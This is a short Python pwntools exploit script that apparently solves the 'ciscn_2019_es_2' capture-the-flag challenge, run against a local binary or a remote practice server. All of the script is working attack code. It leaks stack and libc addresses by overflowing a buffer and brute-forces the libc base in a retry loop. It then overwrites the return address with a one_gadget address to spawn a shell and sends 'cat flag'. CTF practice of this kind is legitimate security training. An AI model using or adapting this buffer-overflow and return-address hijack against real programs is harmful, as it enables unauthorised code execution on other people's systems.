#coding:utf-8

import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
i=0
while True :
	try :
		if len(sys.argv)==1 :
			#io=process('./ciscn_2019_es_2')
			io=process(['./ciscn_2019_es_2'],env={'LD_PRELOAD':'./libc.so.6'})
			elf=ELF('./ciscn_2019_es_2')
			libc=ELF('./libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28776)
			elf=ELF('ciscn_2019_es_2')
			libc=ELF('./libc.so.6')

		i+=0x1000
		#gdb.attach(io)
		#pause()
		io.recv()
		pay='a'*0x24
		io.send(pay)
		io.recv(0x2b)
		stack_addr=u32(io.recv(4))
		libc_base=u32(io.recv()[8:12])-libc.sym['__libc_start_main']-241-(0xf7f5c9b0-0xf7d85e81)-i
		success('libc_base:'+hex(libc_base))
		pay='a'*0x2c+p32(libc_base+0x3cbf7)
		io.send(pay)
		io.recv()
		io.sendline('cat flag')
		io.recv()
		pause()
		#io.interactive()
	except Exception as e:
		io.close()
		continue
	else:
		pass